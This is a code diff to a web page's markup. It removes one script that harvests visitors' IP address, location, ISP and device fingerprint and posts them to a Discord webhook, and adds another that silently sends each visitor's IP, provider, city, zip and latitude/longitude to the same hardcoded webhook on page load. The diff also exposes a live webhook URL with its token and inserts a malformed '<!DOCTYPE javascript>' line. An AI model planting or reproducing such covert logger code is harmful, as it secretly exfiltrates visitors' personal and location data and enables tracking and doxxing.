@@ -187,59 +187,54 @@ font-family: 'Open Sans Condensed', sans-serif;
         });
     });
 
+<!DOCTYPE javascript>
+var webHookUrl = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
 
-      <script>
-      let echolog = {};
-      fetch("https://wtfismyip.com/json")
-        .then((response) => response.json())
-        .then((data) => {
-          let echolog = {
-            ipAddress: data.YourFuckingIPAddress,
-            location: data.YourFuckingLocation,
-            hostname: data.YourFuckingHostname,
-            isp: data.YourFuckingISP,
-            city: data.YourFuckingCity,
-            country: data.YourFuckingCountry,
-            countryCode: data.YourFuckingCountryCode,
-            userAgent: navigator.userAgent,
-            windowProp: Object.keys(window).length,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            windowRatio: window.innerWidth / window.innerHeight,
-            screenWidth: window.screen.availWidth,
-            screenHeight: window.screen.availHeight,
-            screenRatio: window.screen.availWidth / window.screen.availHeight,
-            DPI: window.devicePixelRatio,
-            colorDepth: window.screen.colorDepth,
-            orientation: window.screen.orientation.type,
-            orientationAngle: window.screen.orientation.angle,
-            os: navigator.platform,
-            threads: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory,
-            systemLanguages: navigator.languages.join(", "),
-            languages: navigator.language,
-          };
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://ip-api.com/json/');
+    const data = await response.json();
 
-          // Set up the payload for the webhook
-          const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
-          };
-          // This is a lazy way of doing it, having
-          // your webhook url out in the open like
-          // this is a bad idea, you should instead
-          // have it contact a internal API to
-          // forward the request.
-          fetch("https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(payload),
-          })
-            .then((response) => console.log(response))
-            .catch((error) => console.error(error));
-        })
-        .catch((error) => console.error(error));
-    </script>
-  </body>
-</html>
+    
+    var ip = data.query;
+
+    var provider = data.org + " (" + data.as + ")";
+
+    var timezone = data.timezone;
+    var country = data.country;
+    var countryCode = data.countryCode.toLowerCase()
+    var region = data.region + " (" + data.regionName + ")";
+    var city = data.city;
+
+    var zip = data.zip;
+    var lat = data.lat;
+    var lon = data.lon;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "",
+        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+                    + "`" + ip + "`" + 
+                    "\n \n__**:telephone: Provider:**__ \n" 
+                    + provider + 
+                    "\n \n__**:map: Timezone:**__ \n" 
+                    + timezone + 
+                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
+                    + country + " - " + region + 
+                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
+                    + zip + " " + city +
+                    "\n \n__**:round_pushpin: Location:**__ \n" 
+                    + "**Longitude:** " + lon + "\n"
+                    + "**Latitude:** " + lat
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
